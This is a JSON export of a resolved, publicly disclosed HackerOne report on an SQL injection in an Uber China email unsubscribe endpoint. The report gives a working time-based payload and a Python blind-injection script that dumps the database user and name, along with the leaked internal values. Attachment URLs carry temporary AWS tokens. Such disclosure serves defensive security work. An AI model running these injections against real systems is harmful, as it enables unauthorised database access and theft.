@@ -1,0 +1,138 @@
+{
+  "id": 150156,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTAxNTY=",
+  "url": "https://hackerone.com/reports/150156",
+  "title": "SQL Injection on sctrack.email.uber.com.cn",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-07-09T01:20:01.777Z",
+  "submitted_at": "2016-07-09T01:20:01.777Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "orange",
+    "url": "/orange",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 314,
+    "url": "https://hackerone.com/uber",
+    "handle": "uber",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Uber",
+      "twitter_handle": "",
+      "website": "https://www.uber.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-07-25T16:29:55.725Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-07-16T01:26:17.780Z",
+  "team_member_agreed_on_going_public_at": "2016-07-25T16:29:55.613Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, Uber Security team\n\nI just traveled to China,  when I call Uber in China. I received an advertisement mail from Uber and I found the unsubscribe link is different from the original unsubscribe link, and there is a SQL Injection under the unsubscribe link.\n\nYou can see where to find the unsubscribe link from the attachments.\n\nThe parameter of user_id is suffered from SQL Injection.\n\nPayload\n```\nhttp://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==\n```\n\nYou can see the server sleep 12 seconds.\n\nI write a script to dump the database name and user name.\n```\nimport json\nimport string\nimport requests\nfrom urllib import quote\nfrom base64 import b64encode\n\nbase = string.digits + '_-@.'\npayload = {\"user_id\": 5755, \"receiver\": \"blog.orange.tw\"}\n\nfor l in range(0, 30):\n    for i in 'i'+base:\n        payload['user_id'] = \"5755 and mid(user(),%d,1)='%c'#\"%(l+1, i)\n        new_payload = json.dumps(payload)\n        new_payload = b64encode(new_payload)\n        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))\n\n        if len(r.content)>0:\n            print i,\n            break\n```\n\nThe username of mysql user is `sendcloud_w@10.9.79.210`\nThe database name is `sendcloud`\n\n\n",
+  "bounty_amount": "4000.0",
+  "formatted_bounty": "$4,000",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 104017,
+      "file_name": "2016-07-09_071009.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/104/017/b6def62701f6e33dbb83163d3a50d37c36a469ab/2016-07-09_071009.jpg?response-content-disposition=attachment%3B%20filename%3D%222016-07-09_071009.jpg%22%3B%20filename%2A%3DUTF-8%27%272016-07-09_071009.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ3BKZOEE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121729Z&X-Amz-Expires=3138&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIG6IenXByqkn3Q4DzIOoyCRmUa9piCrSguk1c5%2FILyJ7AiEAykcOsXd4dfj0MtryP7Ypqcz0EGqy2srC7Ahyju9P1wwqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNoh%2FatXkiXqzvRarSqPBSxRPdxDhM3ZWovfuUDFze8TKTTXyWnM%2BqLvvwol8L9J5VDQFkQXA7smucDX4AEp9WwjM1M5SoDxfIqGVNACAZ%2FhCWOou%2FjPGm5hXxkVid3k%2FfBEIUStu2OCGILQXKrFXckdXocqxibxJkp9FBscVVfy1z9spS224jk9a64wEyKkB%2FEqDONaGznbocoqfOWRO2gk3kN2mF%2FlFYwuvjMbBGI25CA0c8P0uDrdXv75mMgHiHzhQ2UA0io6mOBJRxlcl5iTWXpEwOcbqq7%2B5ONf7AQWMJlf044SZPS7ctrMSsbHt11897THGeHPEYn6tBP8I5Fnd6qJj2f%2FVMm2nAjyPv65mqH9IFrso33MbOg9OScFT8GcXL%2FSL9CsmuqI8DAuHV2TQ6tOcf60FFoK%2FNc8%2BH1opXPi5t84Wy8dXz0ShSZARezbri6JYCQuZaMmQWSTRbaOxgDpQUbmc2MtnSfbshwx0iX%2BKoAaAhWHkgNlastBKxxdkZZfKj3uPWL%2FAZpJ5vQ3aCiYuhMiLdSNoDq04UJUEE6U3x5bncELirAw9rSBGBlZ2LnTIizRqNNZcm4bzUeL8KfXYWONTy2NjqxuN2Pv%2FhvWs7ZeUu%2Bl5RyG%2BaglXVojqzVcfe0pYyyTxENUtLQnCxv1F6%2BFRPB1kbi%2FlMdY30Ih91ui923zixOr4x2bTvqsEUosHXQuAePevTEs9cXth9Tl9dEZ77qdYODIErVxnZKWIWL%2Bdg57Wo05wOYkPoMuK0ANx9QnIFRVpYN51rM3ygm3cI0FCy6O67TKyAzlM4W7pyg0gugDJWcmjphUjUsnNWj%2BZQCUHNlg0hrBypo%2BHXJ4oZgGe0%2F80G6Eur1xfPo2GRyn5qtYCGPsRlYw8qesrgY6sQGYbS8MxVrsunWUBMnltzktg6eAZ8fvxgC5j8%2BYmwaIMOuBsufYAl7nKraCTIkLFC7rGgVC8sqvqoXBLrYQFqgLumTDGfWJUNAVMAVtqNo%2BIL8JvOZD%2FTW4GOmqGMXOgQRmU1Wa7j36A2IvAe7wpP5z8dprPILpwsnYzL4pzdM%2FrRrGA5fhAddbNV%2BDoX4yqjS2RN%2BKe8v5EYqHMPr2TCLmUPcDm070amRAZC10%2F9gLePE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b8c30753a0bee33339f095b87e7ccf591f075992633734dc57cd693b2ad9c476",
+      "file_size": 118906,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 104018,
+      "file_name": "2016-07-09_070035.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/104/018/52de4167a7e3b2cafe30e12a8029e309a5c5a078/2016-07-09_070035.jpg?response-content-disposition=attachment%3B%20filename%3D%222016-07-09_070035.jpg%22%3B%20filename%2A%3DUTF-8%27%272016-07-09_070035.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ3BKZOEE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121729Z&X-Amz-Expires=3138&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIG6IenXByqkn3Q4DzIOoyCRmUa9piCrSguk1c5%2FILyJ7AiEAykcOsXd4dfj0MtryP7Ypqcz0EGqy2srC7Ahyju9P1wwqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNoh%2FatXkiXqzvRarSqPBSxRPdxDhM3ZWovfuUDFze8TKTTXyWnM%2BqLvvwol8L9J5VDQFkQXA7smucDX4AEp9WwjM1M5SoDxfIqGVNACAZ%2FhCWOou%2FjPGm5hXxkVid3k%2FfBEIUStu2OCGILQXKrFXckdXocqxibxJkp9FBscVVfy1z9spS224jk9a64wEyKkB%2FEqDONaGznbocoqfOWRO2gk3kN2mF%2FlFYwuvjMbBGI25CA0c8P0uDrdXv75mMgHiHzhQ2UA0io6mOBJRxlcl5iTWXpEwOcbqq7%2B5ONf7AQWMJlf044SZPS7ctrMSsbHt11897THGeHPEYn6tBP8I5Fnd6qJj2f%2FVMm2nAjyPv65mqH9IFrso33MbOg9OScFT8GcXL%2FSL9CsmuqI8DAuHV2TQ6tOcf60FFoK%2FNc8%2BH1opXPi5t84Wy8dXz0ShSZARezbri6JYCQuZaMmQWSTRbaOxgDpQUbmc2MtnSfbshwx0iX%2BKoAaAhWHkgNlastBKxxdkZZfKj3uPWL%2FAZpJ5vQ3aCiYuhMiLdSNoDq04UJUEE6U3x5bncELirAw9rSBGBlZ2LnTIizRqNNZcm4bzUeL8KfXYWONTy2NjqxuN2Pv%2FhvWs7ZeUu%2Bl5RyG%2BaglXVojqzVcfe0pYyyTxENUtLQnCxv1F6%2BFRPB1kbi%2FlMdY30Ih91ui923zixOr4x2bTvqsEUosHXQuAePevTEs9cXth9Tl9dEZ77qdYODIErVxnZKWIWL%2Bdg57Wo05wOYkPoMuK0ANx9QnIFRVpYN51rM3ygm3cI0FCy6O67TKyAzlM4W7pyg0gugDJWcmjphUjUsnNWj%2BZQCUHNlg0hrBypo%2BHXJ4oZgGe0%2F80G6Eur1xfPo2GRyn5qtYCGPsRlYw8qesrgY6sQGYbS8MxVrsunWUBMnltzktg6eAZ8fvxgC5j8%2BYmwaIMOuBsufYAl7nKraCTIkLFC7rGgVC8sqvqoXBLrYQFqgLumTDGfWJUNAVMAVtqNo%2BIL8JvOZD%2FTW4GOmqGMXOgQRmU1Wa7j36A2IvAe7wpP5z8dprPILpwsnYzL4pzdM%2FrRrGA5fhAddbNV%2BDoX4yqjS2RN%2BKe8v5EYqHMPr2TCLmUPcDm070amRAZC10%2F9gLePE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d71560ba5903debd527b3050f1e5f10c9c4caac851751e7e1b88aa794dd983af",
+      "file_size": 166951,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 104019,
+      "file_name": "2016-07-09_071022.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/104/019/dee97fbb38068817259432525c4701036aa352f3/2016-07-09_071022.jpg?response-content-disposition=attachment%3B%20filename%3D%222016-07-09_071022.jpg%22%3B%20filename%2A%3DUTF-8%27%272016-07-09_071022.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ3BKZOEE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121729Z&X-Amz-Expires=3138&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIG6IenXByqkn3Q4DzIOoyCRmUa9piCrSguk1c5%2FILyJ7AiEAykcOsXd4dfj0MtryP7Ypqcz0EGqy2srC7Ahyju9P1wwqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNoh%2FatXkiXqzvRarSqPBSxRPdxDhM3ZWovfuUDFze8TKTTXyWnM%2BqLvvwol8L9J5VDQFkQXA7smucDX4AEp9WwjM1M5SoDxfIqGVNACAZ%2FhCWOou%2FjPGm5hXxkVid3k%2FfBEIUStu2OCGILQXKrFXckdXocqxibxJkp9FBscVVfy1z9spS224jk9a64wEyKkB%2FEqDONaGznbocoqfOWRO2gk3kN2mF%2FlFYwuvjMbBGI25CA0c8P0uDrdXv75mMgHiHzhQ2UA0io6mOBJRxlcl5iTWXpEwOcbqq7%2B5ONf7AQWMJlf044SZPS7ctrMSsbHt11897THGeHPEYn6tBP8I5Fnd6qJj2f%2FVMm2nAjyPv65mqH9IFrso33MbOg9OScFT8GcXL%2FSL9CsmuqI8DAuHV2TQ6tOcf60FFoK%2FNc8%2BH1opXPi5t84Wy8dXz0ShSZARezbri6JYCQuZaMmQWSTRbaOxgDpQUbmc2MtnSfbshwx0iX%2BKoAaAhWHkgNlastBKxxdkZZfKj3uPWL%2FAZpJ5vQ3aCiYuhMiLdSNoDq04UJUEE6U3x5bncELirAw9rSBGBlZ2LnTIizRqNNZcm4bzUeL8KfXYWONTy2NjqxuN2Pv%2FhvWs7ZeUu%2Bl5RyG%2BaglXVojqzVcfe0pYyyTxENUtLQnCxv1F6%2BFRPB1kbi%2FlMdY30Ih91ui923zixOr4x2bTvqsEUosHXQuAePevTEs9cXth9Tl9dEZ77qdYODIErVxnZKWIWL%2Bdg57Wo05wOYkPoMuK0ANx9QnIFRVpYN51rM3ygm3cI0FCy6O67TKyAzlM4W7pyg0gugDJWcmjphUjUsnNWj%2BZQCUHNlg0hrBypo%2BHXJ4oZgGe0%2F80G6Eur1xfPo2GRyn5qtYCGPsRlYw8qesrgY6sQGYbS8MxVrsunWUBMnltzktg6eAZ8fvxgC5j8%2BYmwaIMOuBsufYAl7nKraCTIkLFC7rGgVC8sqvqoXBLrYQFqgLumTDGfWJUNAVMAVtqNo%2BIL8JvOZD%2FTW4GOmqGMXOgQRmU1Wa7j36A2IvAe7wpP5z8dprPILpwsnYzL4pzdM%2FrRrGA5fhAddbNV%2BDoX4yqjS2RN%2BKe8v5EYqHMPr2TCLmUPcDm070amRAZC10%2F9gLePE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bfb935b5582431c42f4f5012a4e3ed1312d1c5cf16eded3493c5b6b783abc0d7",
+      "file_size": 30069,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-08-15T01:26:17.993Z",
+  "allow_singular_disclosure_after": -236602271.48748368,
+  "singular_disclosure_allowed": true,
+  "vote_count": 82,
+  "voters": [
+    "signalchaos",
+    "mashoud1122",
+    "bogdantcaciuc",
+    "hunter",
+    "michiel",
+    "orange",
+    "ta8ahi",
+    "spam404",
+    "hackerhero",
+    "yaworsk",
+    "and 72 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
